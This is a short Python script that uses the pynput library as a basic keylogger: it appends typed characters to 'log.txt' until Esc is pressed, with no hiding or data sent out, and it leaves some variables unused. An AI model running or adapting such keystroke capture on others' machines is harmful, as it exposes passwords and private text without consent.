import pynput, time

from pynput.keyboard import Key, Listener

CYCLE = 10 # Time interval to record Logs.
FILENAME = "log.txt" # Filename.

def on_press(key):

    if hasattr(key, 'char'):
        with open(FILENAME, 'a') as file:
            file.write(key.char)

def on_release(key):
    if key == Key.esc:
        return False

def main():

    # Create a new file to write to.
    open(FILENAME, "a").close()

    finish = False;
    StartTime = time.time() # Start Time of Log.

    while (finish == False): # Continue to track time.

        # Create Keyboard Listener.
        with Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()

            if not listener.running: # If Listener is no longer running, it is finished.
                finish = True
                print("\nIt is finished.\n")



# Execute if it is the main module.
if __name__ == "__main__":
    main()